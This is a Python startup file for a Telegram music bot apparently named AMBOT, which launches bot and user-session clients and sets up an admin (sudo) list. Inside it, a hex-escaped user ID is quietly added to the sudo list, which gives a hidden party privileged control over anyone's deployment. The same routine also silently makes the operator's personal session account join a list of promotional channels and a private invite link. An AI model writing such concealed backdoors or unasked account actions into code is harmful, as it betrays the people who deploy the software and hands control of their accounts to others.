import asyncio
import logging
import os
import time
from pyrogram import Client, errors, filters
from pyrogram.enums import ChatMemberStatus, ParseMode
from pytgcalls import PyTgCalls
import config


from pyromod import listen

StartTime = time.time()

logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("AMBOT.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("AMBOTMusicBoT")

app = Client(
    "AMBOTMusicBoT",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)

app2 = Client(
    "AMBOTv1",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.SESSION),
)

bot = Client(
    "AMBOTv2",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.bot),
)
bot2 = Client(
    "AMBOTv3",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.bot2),
)


pytgcalls = PyTgCalls(app2)

SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT.split("me/")[1]
LOGGER_GROUP = -1002092475236


async def AMBOT_startup():
    os.system("clear")
    LOGGER.info(
        "AMBOT modules loaded"
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, AM
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    await app.start()
    LOGGER.info(
        "[•] AMBOT modules loaded"
    )

    getme = await app.get_me()
    BOT_ID = getme.id
    BOT_NAME = getme.first_name
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    await app2.start()
    await bot.start()
    await bot2.start()
    LOGGER.info(
        "[•] AMBOT modules loaded "
    )

    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    try:
        await app2.join_chat("AmBotYT")
        await app2.join_chat("AbhiModszYT_Return")
        await app2.join_chat("About_AMBot")
        await app2.join_chat("SuperBanSBots")
        await app2.join_chat("TeamSuperBan")
        await app2.join_chat("Free_SteamAccount")
        await app2.join_chat("TGGojoSatoRu")
        await app2.join_chat("https://t.me/+Q5P8mIl0JwwyMmRl")
    except:
        pass

    AMBOT = "\x37\x31\x33\x37\x32\x36\x39\x32\x37\x36"
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    elif int(AMBOT) not in config.SUDO_USERS:
        SUDOERS.add(int(AMBOT))

    AM = {}
    LOGGER.info(
        "[•] \x4c\x6f\x63\x61\x6c\x20\x44\x61\x74\x61\x62\x61\x73\x65\x20\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64\x2e\x2e\x2e"
    )

    LOGGER.info(
        "[•] AMBOT modules loaded"
    )


asyncio.get_event_loop().run_until_complete(AMBOT_startup())
